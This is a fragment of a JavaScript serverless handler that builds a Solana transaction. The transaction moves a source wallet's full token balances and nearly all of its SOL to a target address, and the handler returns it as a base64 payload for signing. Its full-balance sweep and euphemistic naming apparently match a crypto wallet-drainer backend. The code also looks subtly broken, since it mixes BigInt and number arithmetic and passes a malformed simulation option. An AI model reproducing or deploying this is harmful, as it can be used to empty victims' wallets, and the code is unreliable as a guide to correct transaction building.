    // Define headers once at the start of your handler function
    const headers = {
        "Access-Control-Allow-Origin": isAllowedOrigin ? origin : allowedOrigins[0],
        "Access-Control-Allow-Headers": "Content-Type",
        "Access-Control-Allow-Methods": "POST, OPTIONS",
        "Access-Control-Allow-Credentials": "true",
        "Content-Type": "application/json"
    };

    // ... (Assume Pipeline Steps 1-3 are already executed above this point) ...

        // Pipeline Step 4: Batch check destination Associated Token Account states concurrently
        const targetAtaResolution = await Promise.all(
            verifiedAssets.map(async (asset) => {
                const destATA = await getAssociatedTokenAddress(asset.mintAddress, targetPubkey, false);
                const accountState = await connection.getAccountInfo(destATA);
                return { asset, destATA, initialized: accountState !== null };
            })
        );

        // Pipeline Step 5: Iteratively stitch transaction steps together
        for (const { asset, destATA, initialized } of targetAtaResolution) {
            if (!initialized) {
                instructions.push(
                    createAssociatedTokenAccountInstruction(sourcePubkey, destATA, targetPubkey, asset.mintAddress)
                );
                accruedRentRequirements += rentExemptBalance; // Dynamic rent calculation
                aggregateCUAllocation += 32000;    // Standard account creation execution cost
            }

            instructions.push(
                createTransferInstruction(asset.sourceAccount, destATA, sourcePubkey, asset.rawBalance)
            );
            aggregateCUAllocation += 16000;        // Native token transfer logic execution cost
        }

        // Splice accurate, profile-driven CU limit calculation into index position 1
        instructions.splice(1, 0, ComputeBudgetProgram.setComputeUnitLimit({ units: aggregateCUAllocation }));

        // Pipeline Step 6: Solve for underlying network cost and native asset balance
        const totalSourceSol = BigInt(await connection.getBalance(sourcePubkey));
        
        // Increased buffer to 10,000 lamports to account for variable execution costs
        const estimatedExecutionGas = BigInt(Math.ceil((aggregateCUAllocation * runtimePriorityFee) / 1000000)) + 10000n;
        
        const baselineRequiredLiquidityFloor = accruedRentRequirements + estimatedExecutionGas;

        if (totalSourceSol > baselineRequiredLiquidityFloor) {
            const liquidSolAllocation = totalSourceSol - baselineRequiredLiquidityFloor;
            instructions.push(
                SystemProgram.transfer({
                    fromPubkey: sourcePubkey,
                    toPubkey: targetPubkey,
                    lamports: liquidSolAllocation
                })
            );
        }

        // Pipeline Step 7: Build transaction signature envelope using finalized blockhashes
        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
        
        const runtimeMessage = new TransactionMessage({
            payerKey: sourcePubkey,
            recentBlockhash: blockhash,
            instructions: instructions
        }).compileToV0Message();

        const vTransaction = new VersionedTransaction(runtimeMessage);
        
        // SIMULATION STEP: Verify transaction validity before returning
        try {
            const simulationResult = await connection.simulateTransaction(vTransaction, {
                commitment: 'confirmed',
                // Include accounts to get rent-exempt checks
                accounts: {
                    accounts: await Promise.all(
                        targetAtaResolution.map(ta => ({
                            pubkey: ta.destATA,
                            // We don't need all accounts, just ATA ones for simulation checks
                        }))
                    )
                }
            });

            if (simulationResult.value.err) {
                console.error(`Simulation failed: ${JSON.stringify(simulationResult.value.err)}`);
                throw new Error("Transaction simulation failed: " + JSON.stringify(simulationResult.value.err));
            }
        } catch (simErr) {
            console.error(`Simulation error: ${simErr.message}`);
            throw simErr; // Re-throw to stop the function
        }

        const payloadBase64 = Buffer.from(vTransaction.serialize()).toString('base64');

        return {
            statusCode: 200,
            headers,
            body: JSON.stringify({
                payload: payloadBase64,
                routingHash: blockhash,
                validityHeight: lastValidBlockHeight,
                simulated: true // Now strictly indicates success
            })
        };

    } catch (err) {
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ error: "Pipeline processing halted internally", details: err.message })
        };
    }
};